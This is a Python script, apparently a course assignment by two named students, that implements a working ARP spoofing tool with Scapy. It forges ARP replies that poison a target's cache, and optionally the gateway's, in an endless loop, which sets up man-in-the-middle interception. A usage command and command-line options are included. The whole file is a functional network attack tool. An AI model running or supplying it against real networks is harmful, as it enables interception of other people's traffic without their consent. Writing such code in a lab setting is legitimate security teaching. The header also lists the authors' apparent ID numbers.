# Ariel Bar Kalifa 214181604
# Yedidia Marashe 213661499

from scapy.all import *
import argparse
import time

# example usage:
# sudo python3 ArpSpoofer.py -i eth0 -t 10.0.0.1 -d 5 -gw

ARP_ISAT_CODE = 2
IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"   


def get_mac_by_ip(ip):
    """
    get MAC address of a specified IP.
    """
    if ip == "255.255.255.255":
        return "ff:ff:ff:ff:ff:ff"

    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    response = srp1(arp_request, timeout=1, verbose=False)
    if response:
        return(response.src)
    return None

def validate_ip_address(address):
    """
    Validate an ip address for argparse constraint matching.
    """
    if re.match(IP_REGEX, address):
        return address
    raise argparse.ArgumentTypeError('invalid value for ip argument (src or target)')


def spoof(args : dict):
    """
    param args: dictionary of arguments.
    supports: - interface (assuming valid)
              - source (default is gateway)
              - delay
              - gw
              - target(required)
    """
    # get gw ip
    gw_ip = conf.route.route("0.0.0.0")[2]
    # get target MAC address
    target_mac = get_mac_by_ip(args['target'])

    if not target_mac:
        print("target IP mac address could not be resolved")
        return

    # create the arp packet
    arp_packets = list(Ether(dst=target_mac)/ARP(op=ARP_ISAT_CODE,pdst=args['target'],hwdst=target_mac,\
                                                psrc=args['src'] if args['src'] else gw_ip))

    # if gw is to be attacked as well, create a packet
    if args['gw']:
        # get gateway MAC address
        gw_mac = get_mac_by_ip(gw_ip)
        # create the arp packet
        arp_packets.append(Ether(dst=gw_mac)/ARP(op=ARP_ISAT_CODE,pdst=gw_ip,hwdst=gw_mac,psrc=args['target']))
    
    # send the arp packets to the target every DELAY_TIME sec
    while True:
        sendp(arp_packets, iface=args['iface'], verbose=0)
        for packet in arp_packets:
            print(f"sent arp packet: {packet[ARP].psrc} is at {packet[ARP].hwsrc} to {packet[ARP].pdst}")
        print('\n')
        time.sleep(args["delay"])
        


def main():
    # initialize argument parser for command line
    parser = argparse.ArgumentParser(description="Spoof ARP tables")
    parser.add_argument("-i","--iface", help="Interface you wish to use", choices=get_if_list())
    parser.add_argument("-s","--src", type=validate_ip_address, help="The address you want for the attacker")
    parser.add_argument("-d","--delay", type=float, default=1, help="Delay (in seconds) between messages")
    parser.add_argument("-gw", action='store_true', help="should GW be attacked as well")
    parser.add_argument("-t","--target", help="IP of target", type=validate_ip_address, required=True)
    
    args = parser.parse_args()
    spoof(vars(args))


if __name__ == "__main__":
    main()                                                                     

